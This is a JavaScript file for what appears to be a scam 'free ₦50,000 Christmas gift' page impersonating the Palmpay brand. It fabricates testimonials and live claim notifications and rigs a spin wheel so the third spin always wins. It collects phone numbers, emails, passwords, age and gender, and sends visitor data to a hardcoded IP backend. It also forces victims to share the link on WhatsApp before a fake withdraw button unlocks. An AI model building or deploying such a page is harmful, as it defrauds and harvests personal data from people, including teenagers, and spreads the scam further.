// At the top of script.js
const API_URL = 'http://20.164.17.30:5000/api'; // Change to your backend URL
let sessionId = localStorage.getItem('sessionId') || 'session_' + Date.now() + '_' + Math.random().toString(36);
localStorage.setItem('sessionId', sessionId);

// Track visit on page load
fetch(`${API_URL.replace('/api', '')}/api/visit`, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' }
}).catch(err => console.log('Visit tracking failed'));

// Function to save progress
async function saveProgress(step, data = {}) {
  try {
    await fetch(`${API_URL}/progress`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ sessionId, currentStep: step, data })
    });
  } catch (error) {
    console.error('Failed to save progress:', error);
  }
}

// Call saveProgress() at each step
// Example: saveProgress('step1', { hasPalmpayAccount: true });
    // ------------ BLOG COMMENT SYSTEM + CLAIM NOTIFICATION ---------
    const testimoniesPool = [
        {name: "Isaac Okon", body: "Wow! I can't believe it. Palmpay sent me ₦50,000 instantly. Merry Christmas!"},
        {name: "Ngozi Uche", body: "This made my month! Thanks for the fast credit Palmpay."},
        {name: "Abdul Rahman", body: "It really worked! I just got ₦50,000, thank you so much."},
        {name: "Victoria Mordi", body: "I signed up out of curiosity and just received my Christmas gift."},
        {name: "Benjamin Ayi", body: "No stories, I'm now ₦50,000 richer! Palmpay is the real deal."},
        {name: "Chidinma Igwe", body: "I claimed my gift within minutes. Never been this surprised!"},
        {name: "Yusuf Lawal", body: "Told my friends, and we are all smiling now. Thanks Palmpay!"},
        {name: "Ifeanyi Chukwu", body: "Fast, reliable, real! God bless Palmpay!"},
        {name: "Janet Folarin", body: "Just when I needed it most. Got the 50k alert! Highly recommend."},
        {name: "Samuel Sunday", body: "No cap, just received my ₦50,000. God bless!"},
        {name: "Omolara Ajayi", body: "The best Christmas ever. Palmpay you are awesome!"},
        {name: "Blessing Eze", body: "Got an alert right on time. Thank you Palmpay."}
      ];
      const claimantsPool = testimoniesPool.map(t=>t.name).concat([
        "Gbenga Kayode","Emmanuella Frank","Folasade Iwu","Damian Joseph","Mary Johnson","Steven Nwosu","Halima Musa"
      ]);
      let comments = [];
      const MAX_COMMENTS = 5;
      function getInitials(name) {return name.split(' ').map(p => p[0]).join('').substring(0,2).toUpperCase();}
      function randomAvatarBg(name) {
        const hues = [120,180,80,45,160,140,88,38,210,240,74,200,260,39];
        let idx = name.charCodeAt(0) % hues.length;
        return `background:hsl(${hues[idx]},79%,87%);color:#116128;`;
      }
      function relTime(ts) {
        let diff = Math.floor((Date.now() - ts)/1000);
        if (diff < 1) return "just now";
        if (diff < 20) return `${diff} seconds ago`;
        if (diff < 60) return "20 seconds ago";
        if (diff < 120) return "1 min ago";
        if (diff < 3600) return `${Math.floor(diff/60)} mins ago`;
        if (diff < 7200) return "1 hr ago";
        return `${Math.floor(diff/3600)} hrs ago`;
      }
      function renderComments() {
        let cList = document.getElementById("comments-list");
        cList.innerHTML = "";
        comments.forEach((t, idx) => {
          cList.innerHTML += `
          <div class="comment-block">
            <div class="comment-avatar" style="${randomAvatarBg(t.name)}">${getInitials(t.name)}</div>
            <div class="comment-main">
              <div><span class="comment-name">${t.name}</span> <span class="comment-time" data-idx="${idx}">${relTime(t.ts)}</span></div>
              <div class="comment-text">${t.body}</div>
            </div>
          </div>`;
        });
      }
      function updateCommentTimes() {
        document.querySelectorAll('.comment-time').forEach(span => {
          let idx = parseInt(span.dataset.idx,10);
          if (!isNaN(idx) && comments[idx]) {
            span.textContent = relTime(comments[idx].ts);
          }
        });
      }
      setInterval(updateCommentTimes, 1000);
      function showClaimNotification(name, acct) {
        const notifDiv = document.getElementById("claim-notification");
        document.getElementById("notif-msg").innerHTML =
          `<strong>${name}</strong> just claimed ₦50,000 to Palmpay account <strong>****${acct}</strong>`;
        notifDiv.style.display = "block";
        notifDiv.firstElementChild.style.animation = "slideInNotif 0.33s";
        setTimeout(()=>{notifDiv.style.display = "none";}, 3000 + Math.random()*1200);
      }
      function addComment(t, tsOverride) {
        if(tsOverride)t.ts=tsOverride;
        comments.unshift(t);
        while (comments.length > MAX_COMMENTS) comments.pop();
        renderComments();
      }
      function randomAccount() {return Math.floor(1000+Math.random()*9000);}
      function randomClaimant() {return claimantsPool[Math.floor(Math.random()*claimantsPool.length)];}
      function runNotifyLoop() {
        function nextNotify() {
          let name = randomClaimant();
          showClaimNotification(name, randomAccount());
          let tIdx = testimoniesPool.findIndex(t=>t.name===name);
          if(tIdx !== -1 && Math.random()<0.6){
            let t = {...testimoniesPool[tIdx], ts: Date.now()};
            setTimeout(()=>addComment({...t, ts: Date.now()}),1000+Math.random()*3000);
          }
          setTimeout(nextNotify, 3800+Math.random()*5400);
        }
        nextNotify();
      }
      function preloadComments() {
        let arr = [];
        for (let i=0; i<MAX_COMMENTS; ++i) {
          let t = {...testimoniesPool[i % testimoniesPool.length]};
          t.ts = Date.now()-(Math.floor(Math.random()*25+1)*60000);
          arr.push(t);
        }
        comments = arr;
        renderComments();
      }
  
      // ---- LANDING PAGE LOGIC ----
      function showLoadingStep() {
        saveProgress('loading'); // ADD THIS
        document.getElementById('main-content').innerHTML = `
          <div class="step-card text-center">
            <div class="spinner-border" role="status"></div>
            <div class="loading-text mb-2">
              <strong>Checking prize eligibility...</strong>
            </div>
          </div>
        `;
        setTimeout(() => {
          document.getElementById('main-content').innerHTML = `
            <div class="step-card text-center">
              <div class="spinner-border" role="status"></div>
              <div class="loading-text mb-2"><strong>Checking available slots...</strong></div>
            </div>`;
          setTimeout(showEligibleStep, 2000);
        }, 1500);
      }
      function showEligibleStep() {
        saveProgress('eligible'); // ADD THIS
        document.getElementById('main-content').innerHTML = `
          <div class="step-card text-center">
            <svg class="checkmark" viewBox="0 0 52 52">
                <circle class="checkmark__circle" cx="26" cy="26" r="25" />
                <path class="checkmark__check" d="M14 28l8 8 16-16"/>
            </svg>
            <h5 class="mb-3" style="color:var(--palmpay-purple); font-weight:600;">
              You're eligible 🎉<br>
              <span style="font-size:1.1em; color:#c72;">2477 slots only!</span>
            </h5>
            <button class="btn btn-palmpay btn-lg w-100 mt-3" onclick="showStep1()">Proceed To Claim Prize</button>
          </div>`;
      }
      function showStep1() {
        saveProgress('step1'); // ADD THIS
        document.getElementById('main-content').innerHTML = `
          <div class="step-card text-center">
            <h5>Do you have a Palmpay account?</h5>
            <div class="d-grid gap-3 mt-4">
              <button class="btn btn-palmpay" onclick="handlePalmpayAccount(true)">Yes</button>
              <button class="btn btn-outline-dark" onclick="handlePalmpayAccount(false)">No</button>
            </div>
          </div>`;
      }
      function handlePalmpayAccount(hasAccount) {
        saveProgress('step1', { hasPalmpayAccount: hasAccount }); // ADD THIS
      hasAccount ? showStep2() : showRegistrationForm(); }
      function showStep2() {
        saveProgress('step2'); // ADD THIS
        document.getElementById('main-content').innerHTML = `
          <div class="step-card text-center">
            <h5>Did you apply for this prize last year?</h5>
            <div class="d-grid gap-3 mt-4">
              <button class="btn btn-palmpay" onclick="handleAppliedLastYear('Yes')">Yes</button>
              <button class="btn btn-outline-dark" onclick="handleAppliedLastYear('No')">No</button>
            </div>
          </div>`;
      }
      function handleAppliedLastYear(ans) {
        saveProgress('step2', { appliedLastYear: ans === 'Yes' }); // ADD THIS
        showGenderStep(); }
      function showGenderStep() {
        saveProgress('gender'); // ADD THIS
        document.getElementById('main-content').innerHTML = `
          <div class="step-card text-center">
            <h5>Select your gender</h5>
            <div class="d-grid gap-3 mt-4">
              <button class="btn btn-palmpay" onclick="handleGender('Male')">Male</button>
              <button class="btn btn-outline-dark" onclick="handleGender('Female')">Female</button>
            </div>
          </div>`;
      }
      function handleGender(gender) {
        saveProgress('gender', { gender }); // ADD THIS
        showAgeStep(); }
      function showAgeStep() {
        saveProgress('age'); // ADD THIS
        document.getElementById('main-content').innerHTML = `
          <div class="step-card text-center">
            <h5>Select your age range</h5>
            <div class="d-grid gap-3 mt-4">
              <button class="btn btn-palmpay age-btn" onclick="handleAgeRange('13-17', event)">13-17</button>
              <button class="btn btn-palmpay age-btn" onclick="handleAgeRange('18-24', event)">18-24</button>
              <button class="btn btn-palmpay age-btn" onclick="handleAgeRange('25-34', event)">25-34</button>
              <button class="btn btn-palmpay age-btn" onclick="handleAgeRange('35-44', event)">35-44</button>
              <button class="btn btn-palmpay age-btn" onclick="handleAgeRange('45-54', event)">45-54</button>
              <button class="btn btn-palmpay age-btn" onclick="handleAgeRange('55+', event)">55+</button>
            </div>
          </div>`;
      }
      function handleAgeRange(range, evt) {
        saveProgress('age', { ageRange: range }); // ADD THIS
        Array.from(document.querySelectorAll('.age-btn')).forEach(btn => btn.classList.remove('active'));
        evt.target.classList.add('active');
        setTimeout(showSpinPrizeGame, 600);
      }
      function showRegistrationForm() {
        saveProgress('registration'); // ADD THIS
        document.getElementById('main-content').innerHTML = `
          <div class="step-card text-center">
            <h5>Queue For Registration</h5>
            <form id="regForm" class="text-start mt-3" onsubmit="submitRegistration(event)">
              <label class="form-label">Phone number</label>
              <input class="form-control mb-2" name="phone" type="tel" required placeholder="e.g. 08012345678" maxlength="14">
              <label class="form-label">Email</label>
              <input class="form-control mb-2" name="email" type="email" required placeholder="you@email.com">
              <label class="form-label">Password</label>
              <input class="form-control mb-2" name="password" type="password" required minlength="6" placeholder="New password">
              <button class="btn btn-palmpay w-100 mt-3" type="submit">Submit</button>
            </form>
          </div>`;
      }
      function submitRegistration(e) {
        e.preventDefault();
        const formData = new FormData(e.target);
        saveProgress('registration', { // ADD THIS
          phoneNumber: formData.get('phone'),
          email: formData.get('email')
        });
        showStep2();
      }
  
      // --- SPIN & WIN + SHARE TO WITHDRAW ---
function showSpinPrizeGame() {
  saveProgress('spin'); // ADD THIS
    document.getElementById("main-content").innerHTML = `
      <div class="py-2 text-center">
        <div class="mt-3 mb-2">${renderWheel()}
          <div class="pt-2">
            <button class="btn btn-palmpay btn-lg px-5 mt-3 fw-bold" id="spinBtn">SPIN</button>
          </div>
        </div>
        <div id="spin-attempts-ui" class="my-2 text-center" style="font-weight:500;font-size:1.13em;"></div>
      </div>`;
    
    showModal(`
      <h4 style='color:#800080;'>🎉 Welcome to Spin & Win!</h4>
      <b>You have 3 spin attempts.</b><br>
      We wish you good luck!
      <br><button class="btn btn-palmpay mt-3 px-4" id="spinModalOk">OK</button>
    `, false);
    
    let spins = {attempt:0, history:[], won:false};
    
    document.getElementById('spinModalOk').onclick = function() { 
      closeModal(); 
      updateSpinAttemptsUI(); 
    };
    
         document.getElementById("spinBtn").onclick = function() {
        if (spins.attempt >= 3 || spins.won) return;
        
        // Disable button during spin
        document.getElementById("spinBtn").disabled = true;
        
        spins.attempt++;
        let result;
        
        // SPIN LOGIC: First 2 spins = 50k or Empty only. 3rd spin = guaranteed 50k
        if (spins.attempt < 3) {
          // 30% chance to win on first or second spin
          result = Math.random() < 0.3 ? "₦50,000" : "Empty";
        } else {
          // Third spin always wins
          result = "₦50,000";
        }
        
        spins.history.push(result);
        
        spinWheelToSegment(result, function() {
          spins.history.push(result);
          // Save spin result to backend
  fetch(`${API_URL}/spin`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ sessionId, result })
  }).catch(err => console.log('Spin tracking failed'));
  

          if (result === "₦50,000") {
            spins.won = true;
            saveProgress('spin', { spinData: spins }); // ADD THIS
            showModal(
              `<h3 style='color:#800080;'>🎉 Congratulations!</h3>
              <div style='font-size:1.9em;margin:.9em 0;'>You won ₦50,000!</div>
              <button class="btn btn-palmpay px-4" id="spinWinProceed">Proceed</button>
              `, true
            );
            document.getElementById('spinWinProceed').onclick = function() {
              closeModal();
              showShareToWithdraw();
            }
          } else {
            // Lost this spin
            let remaining = 3 - spins.attempt;
            showModal(
              `<h4 style='color:#ff6b6b;'>😔 Sorry, Empty!</h4>
              <p><b>${remaining} ${remaining === 1 ? 'attempt' : 'attempts'} remaining</b></p>
              <p>Keep trying - you can still win ₦50,000!</p>
              <button class="btn btn-palmpay px-4" onclick="closeModal()">Continue</button>
              `, false
            );
            // Re-enable spin button after modal closes
            setTimeout(() => {
              document.getElementById("spinBtn").disabled = false;
            }, 500);
          }
          updateSpinAttemptsUI();
        });
        
        updateSpinAttemptsUI();
      };
      
      function updateSpinAttemptsUI() {
        document.getElementById("spin-attempts-ui").innerHTML =
          `Attempts Used: <span style='color:#800080'>${spins.attempt}/3</span>` +
          (spins.history.length ? '<br>' + spins.history.map(h =>
            (h === "₦50,000" ? '<span style="color:#23ab54">✓ ₦50,000</span>' : '<span style="color:#a03">✗ Empty</span>')
          ).join(' ') : '');
      }
    
  }
             function renderWheel() {
            const prizes = [
              "₦50,000", "₦500", "₦1,000", "Empty", "₦2,000", "₦100", 
              "₦5,000", "Empty", "₦50,000", "₦200", "₦3,000", "Empty",
              "₦10,000", "₦300", "₦1,500", "Empty"
            ];
            
            let sectors = "";
            const colors = ["#800080", "#ffd700", "#ff6b6b", "#4ecdc4", "#95e1d3", "#f38181"];
            
            for(let i = 0; i < prizes.length; i++) {
              let angle = 360 / prizes.length;
              let rot = i * angle;
              let colorIndex = prizes[i] === "₦50,000" ? 0 : 
                               prizes[i] === "Empty" ? 2 : 
                               (i % 4) + 1;
              let arcColor = colors[colorIndex];
              
              // Calculate text position (75% of radius from center)
              let textRadius = 105;
              let textAngle = (rot) * Math.PI / 180;
              let textX = 150 + textRadius * Math.cos(textAngle);
              let textY = 150 + textRadius * Math.sin(textAngle);
              
              sectors += `<g>
                <path d="M150,150 L${150+140*Math.cos((rot-angle/2)*Math.PI/180)},${150+140*Math.sin((rot-angle/2)*Math.PI/180)} 
                A140,140 0 0,1 ${150+140*Math.cos((rot+angle/2)*Math.PI/180)},${150+140*Math.sin((rot+angle/2)*Math.PI/180)} Z" 
                fill="${arcColor}" stroke="#fff" stroke-width="3" opacity="0.95"/>
                <text x="${textX}" y="${textY}" font-size="${prizes[i].length > 6 ? '9' : '11'}" font-weight="bold" text-anchor="middle"
                  fill="${prizes[i]==="Empty" ? "#fff" : prizes[i]==="₦50,000" ? "#ffd700" : "#222"}">
                  ${prizes[i]}
                </text>
              </g>`;
            }
            
            return `
              <div style="width:340px; margin:auto; position:relative;">
                <svg id="spinwheel" width="300" height="300" viewBox="0 0 300 300" 
                  style="border-radius:50%; box-shadow:0 8px 32px rgba(128,0,128,0.3); transition: none;">
                  <g>${sectors}</g>
                  <circle cx="150" cy="150" r="140" fill="none" stroke="#800080" stroke-width="4"/>
                  <circle cx="150" cy="150" r="20" fill="#800080" stroke="#ffd700" stroke-width="3"/>
                </svg>
                <div style="position:absolute; top:-8px; left:50%; margin-left:-15px; font-size:38px; color:#ff3030; z-index:10; filter:drop-shadow(0 2px 4px rgba(0,0,0,0.3));">▼</div>
              </div>
            `;
          }
          
                    function spinWheelToSegment(result, callback) {
            const prizes = [
              "₦50,000", "₦500", "₦1,000", "Empty", "₦2,000", "₦100", 
              "₦5,000", "Empty", "₦50,000", "₦200", "₦3,000", "Empty",
              "₦10,000", "₦300", "₦1,500", "Empty"
            ];
            
            // Find all indices that match the result
            let idxs = [];
            prizes.forEach((v, i) => { if(v === result) idxs.push(i); });
            const targetIndex = idxs[Math.floor(Math.random() * idxs.length)];
            const angle = 360 / prizes.length; // 22.5 degrees per sector
            
            // Calculate where the pointer should land
            // Pointer is at top (12 o'clock), so we need to align sector center with it
            const fullRotations = 5 + Math.random() * 2; // 5-7 full spins
            const sectorCenterAngle = targetIndex * angle + (angle / 2); // Center of target sector
            const targetRotation = 360 - sectorCenterAngle; // Rotate so sector center aligns with pointer
            const totalRotation = (fullRotations * 360) + targetRotation + (Math.random() * 4 - 2); // Small random variation
            
            let el = document.getElementById("spinwheel");
            let currentRotation = spinWheelToSegment.lastSpin || 0;
            let newRotation = currentRotation + totalRotation;
            
            el.style.transition = "transform 4s cubic-bezier(0.17, 0.67, 0.12, 0.99)";
            el.style.transform = `rotate(${newRotation}deg)`;
            
            spinWheelToSegment.lastSpin = newRotation;
            setTimeout(callback, 4100);
          }
    //   function spinWheelToSegment(result, callback){
    //     let sectors = ["₦50,000", "Empty", "₦50,000", "Empty", "Empty", "₦50,000", "Empty", "Empty"];
    //     let idxs = [];
    //     sectors.forEach((v,i)=>{if(v===result) idxs.push(i);});
    //     const pick = idxs[Math.floor(Math.random()*idxs.length)];
    //     const angle = 360/sectors.length;
    //     let spinAmount = 3*360 + (360 - pick*angle - angle/2 + Math.random()*8 - 4);
    //     let el = document.getElementById("spinwheel");
    //     el.style.transition = "transform 2.3s cubic-bezier(.53,1.7,.45,1)";
    //     el.style.transform = "rotate("+(spinWheelToSegment.lastSpin?spinWheelToSegment.lastSpin + spinAmount:spinAmount)+"deg)";
    //     spinWheelToSegment.lastSpin = (spinWheelToSegment.lastSpin?spinWheelToSegment.lastSpin:0) + spinAmount;
    //     setTimeout(callback, 2200);
    //   }
      function showModal(content, staticBackdrop=true){
        let m=document.createElement('div');
        m.id="popupmodal";
        m.style.cssText="position:fixed;z-index:2100;top:0;left:0;right:0;bottom:0;background:rgba(20,0,30,.32);display:flex;align-items:center;justify-content:center;";
        m.innerHTML = `<div style="max-width:26em;background:#fff;border-radius:12px;box-shadow:0 4px 22px #0002;padding:2.1em 1.1em;text-align:center;position:relative;">
          ${content}
          ${!staticBackdrop?`<br><button class="btn btn-secondary px-4 mt-3" onclick="closeModal()">Close</button>`:""}
          </div>`;
        document.body.appendChild(m);
      }
      function closeModal(){let m=document.getElementById("popupmodal"); if(m)m.remove();}
      function showShareToWithdraw(){
        saveProgress('share'); // ADD THIS
        let fillPercents = [50,65,75,83,88,93,96,97,99,100];
        let prog = {count:0, done:false};
        updateShareUI();
        function updateShareUI(){
          let percent = fillPercents[prog.count]?fillPercents[prog.count]:0;
          let btnDisabled = prog.done||percent>=100?'disabled':'';
          let withdrawReady = percent>=100;
          document.getElementById("main-content").innerHTML = `
            <div class="text-center" style="margin-top:2em;">
              <div style="font-size:2em;margin-bottom:8px;">🎁</div>
              <h2 style="color:#800080;">₦50,000 Prize Claimed</h2>
              <div class="my-3" style="max-width:340px;margin:auto;">
                <div class="progress" style="height:2rem; border-radius:.8em;">
                  <div class="progress-bar" 
                    role="progressbar" 
                    style="width:${percent}%;background:#800080;font-size:1.18em;transition:width .7s;"
                    aria-valuenow="${percent}" aria-valuemin="0" aria-valuemax="100">${percent}%</div>
                </div>
              </div>
              <div style="margin:18px auto 16px;">
                <button id="sharePP" class="btn btn-success fw-bold px-4 py-2" ${btnDisabled}>
                  <img src="https://img.icons8.com/color/32/000000/whatsapp.png" width="28" style="vertical-align:middle;margin-right:7px">
                  Share to WhatsApp
                </button>
              </div>
              <div>
                <button id="withdrawBtn" class="btn btn-palmpay btn-lg px-5" style="opacity:${withdrawReady?1:.5}" ${withdrawReady?'':'disabled'}>
                  Withdraw Now
                </button>
              </div>
            </div>
          `;
          if (!withdrawReady) document.getElementById('sharePP').onclick = doShare;
          document.getElementById('withdrawBtn').onclick = function(){
            if (withdrawReady) {
              saveProgress('completed', { completed: true }); // ADD THIS
              window.location = "/YOUR-WITHDRAW-LINK";
            } 
          }
        }
        function doShare(){
          let shareUrl = encodeURIComponent(location.href);
          let shareText = encodeURIComponent("Claim your free ₦50,000 gift this Christmas from Palmpay! Tap here: "+shareUrl);
          prog.count++;
          if(prog.count>=fillPercents.length){prog.count=fillPercents.length-1;}
          if(fillPercents[prog.count]>=100)prog.done=true;
  // Save share progress to backend
  fetch(`${API_URL}/share`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ sessionId })
  }).catch(err => console.log('Share tracking failed'));
  
  saveProgress('share', { shareProgress: prog }); // ADD THIS

          updateShareUI();
          window.open(`https://wa.me/?text=${shareText}`,'_blank');
        }
      }
  
      // START ON PAGE LOAD
      document.addEventListener("DOMContentLoaded",function(){
        setTimeout(preloadComments, 400);
        setTimeout(runNotifyLoop, 2000);
        showLoadingStep();
      });
    